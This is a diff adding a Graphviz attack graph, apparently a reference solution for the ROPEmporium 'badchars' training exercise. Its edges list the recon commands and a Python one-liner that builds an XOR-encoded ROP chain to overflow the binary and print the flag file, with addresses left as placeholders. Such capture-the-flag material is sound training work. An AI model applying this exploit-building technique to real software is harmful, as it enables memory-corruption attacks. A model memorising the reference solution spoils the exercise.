@@ -1,0 +1,25 @@
+digraph AttackGraph {
+  rankdir=LR;
+  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - ROPEmporium badchars"];
+  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
+  edge [color="#555555", fontname="Helvetica", fontsize=10];
+
+  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
+  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Overflow offset identified"];
+  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Bad characters identified"];
+  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Writable memory identified"];
+  node3 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Write gadget identified"];
+  node4 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Decode gadget identified"];
+  node5 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="print_file located"];
+  node6 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Encoded-write payload crafted"];
+  node7 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Flag printed"];
+
+  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="gdb -q ./badchars"];
+  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="./badchars"];
+  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="readelf -S badchars"];
+  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="ROPgadget --binary badchars | grep \"mov .*\\[.*\\].*\""];
+  node3 -> node4 [color="#555555", fontname="Helvetica", fontsize="10", label="ROPgadget --binary badchars | grep xor"];
+  node4 -> node5 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -d badchars | grep print_file"];
+  node5 -> node6 [color="#555555", fontname="Helvetica", fontsize="10", label="python3 -c \"from struct import pack; import sys; pad=b'A'*40; encoded=b'dnce,vzv'; data=0xDATA_ADDR; pop_r12_r13_r14_r15=0xPOP_R12_R13_R14_R15_RET; mov_r13_r12=0xMOV_QWORD_PTR_R13_R12_RET; xor_r15_r14b=0xXOR_BYTE_PTR_R15_R14B_RET; pop_rdi=0xPOP_RDI_RET; print_file=0xPRINT_FILE; key=0x02; chain=pad + pack('<Q', pop_r12_r13_r14_r15)+encoded+pack('<Q', data)+pack('<Q', key)+pack('<Q', data)+pack('<Q', mov_r13_r12); chain += b''.join(pack('<Q', pop_r12_r13_r14_r15)+b'JUNKJUNK'+pack('<Q',0)+pack('<Q', key)+pack('<Q', data+i)+pack('<Q', xor_r15_r14b) for i in range(8)); chain += pack('<Q', pop_rdi)+pack('<Q', data)+pack('<Q', print_file); sys.stdout.buffer.write(chain)\" > payload.bin"];
+  node6 -> node7 [color="#555555", fontname="Helvetica", fontsize="10", label="./badchars < payload.bin"];
+}
